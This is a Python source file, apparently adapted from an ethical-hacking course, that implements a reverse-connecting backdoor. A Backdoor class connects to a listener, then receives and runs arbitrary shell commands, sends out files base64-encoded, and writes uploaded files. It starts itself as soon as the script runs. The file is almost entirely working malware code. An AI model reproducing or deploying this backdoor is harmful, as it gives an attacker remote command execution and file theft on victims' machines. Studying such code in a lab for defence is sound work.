#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
# ~^~ author:       pi4as3                      ~^~
# ~^~ description:  Backdoor                    ~^~
# ~^~ version:      0.1.0                       ~^~
"""
$$ inspired by ->
@@~~ZSecurity-Python_Ethical-Hacking_From-Scratch_-_Practical~~@@ <-->
&& Version: 1.0 org. - Malware-Backdoor - -- minimal change cause python3.9 &&
"""
import base64
import json
import os
import shlex
import socket
import subprocess
import sys
import traceback
from typing import List, Union, Any


# - ## -- ### --- Backdoor Class --- ### -- ## - #

class Backdoor(object):
    # - ## -- ### --- Const --- ### -- ## - #
    BUFFERSIZE = 1024

    def __init__(self, ip: str = '127.0.0.1', port: int = 26262,
                 server_hello_msg: str = '\n[+] Connection established\n') -> None:
        super(Backdoor, self).__init__()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # - if your Listener wants a message which client and which ip
        # self.connection.send(bytes(server_hello_msg))

    def reliable_send(self, data: Any) -> None:
        json_data = json.dumps(data)
        print(json_data)
        self.connection.send(json_data.encode())

    def reliable_receive(self) -> Any:
        raw_data = b''
        while True:
            packet = self.connection.recv(Backdoor.BUFFERSIZE)
            raw_data += packet
            if len(packet) < Backdoor.BUFFERSIZE:
                break
        print(raw_data)
        if raw_data == '' or raw_data is None:
            # - By empty Transmission, return nothing and dont not serialization
            return 'received: nothing'
        return json.loads(raw_data.decode())

    def execute_system_command(self, command: Any) -> str:
        """ Exec shell command and returns output
        :type command: object
        :param command: execute command list like ['cat', 'longfile.txt'], or a single string like 'cat longfile.txt'
        :return: command output
        """
        try:
            # - try to make the best for command input, more follow
            if isinstance(command, str):
                proc_args = command.split(' ')
            elif isinstance(command, bytes):
                proc_args = command.decode()
            elif not isinstance(command, list):
                try:
                    proc_args = shlex.split(command)
                except BaseException:
                    proc_args = command
            else:
                # - now know! later I find 100% methods for every OS that works to 100% by all that can be come as input
                proc_args = command
            # - Execute the command as list in subprocess on current Platform and return output
            cmd_proc = subprocess.run(args=proc_args, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            out_buff = cmd_proc.stdout
            if hasattr(out_buff, 'decode'):
                return str(out_buff.decode())
            else:
                return str(out_buff)
        except Exception as e:
            return f'''cmd_exec_error:\n*****\n{traceback.format_exc()}\n*****\n{e}'''

    def change_working_directory(self, path: Any) -> str:
        """try to change the working directory from the client and return new position"""
        try:
            os.chdir(path)
            return f'[+] Changed working directory to {os.getcwd()}'
        except Exception as e:
            return f'''change_directory_error:\n***********************\n{traceback.format_exc()}\n**********{e}'''

    def read_file(self, path) -> bytes:
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except OSError:
            return b'OSError:read_file()'

    def write_file(self, filename: Any, content: Any) -> str:
        try:
            if not isinstance(filename, str):
                r''.format(filename)
                print(filename)
            if isinstance(content, str):
                content.encode()
                print(base64.b64decode(content))
            with open(filename, 'wb') as file:
                file.write(base64.b64decode(content))
            return f'[+] The File {filename} successfully written into {os.getcwd()}'
        except OSError:
            return 'OSError:write_file()'


    def run(self) -> None:
        while True:
            command: Union[List[str, bytes], os.PathLike[str]]  = self.reliable_receive()
            if command[0] == 'exit':
                self.connection.close()
                sys.exit()
            elif command[0] == 'cd' and len(command) > 1:
                command_result = self.change_working_directory(command[1])
            elif command[0] == 'download' and len(command) > 1:
                filepath = command[1]
                if os.path.exists(filepath):
                    command_result = self.read_file(filepath)
                elif os.path.exists(command[1:]):
                    # here build in whitespace function
                    command_result = self.read_file(filepath)
                else:
                    current_dir_list = os.listdir(os.getcwd())
                    command_result = f'[-] File does not exist, here a list from current directory:\n{current_dir_list}'
            elif command[0] == 'upload' and len(command) >= 2:
                command_result = self.write_file(command[1], command[2])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)


# - ## -- ### --- Script executing --- ### -- ## - #

bot_platform = Backdoor()
bot_platform.run()
